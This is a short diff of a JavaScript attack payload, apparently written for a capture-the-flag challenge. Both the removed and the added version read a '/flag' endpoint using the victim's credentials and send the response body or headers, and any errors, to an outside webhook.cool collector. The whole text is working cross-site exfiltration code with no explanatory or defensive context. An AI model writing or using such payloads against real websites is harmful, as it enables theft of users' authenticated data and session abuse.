@@ -1,5 +1,1 @@
-var x=new XMLHttpRequest();
-x.open('GET','https://api.netquocca.quoccacorp.com/flag',false);
-x.withCredentials=true;
-x.send();
-fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:x.responseText});
+fetch('https://api.netquocca.quoccacorp.com/flag',{credentials:'include'}).then(function(r){var h='';r.headers.forEach(function(v,k){h+=k+':'+v+';'});fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:h})}).catch(function(e){fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:String(e)})})
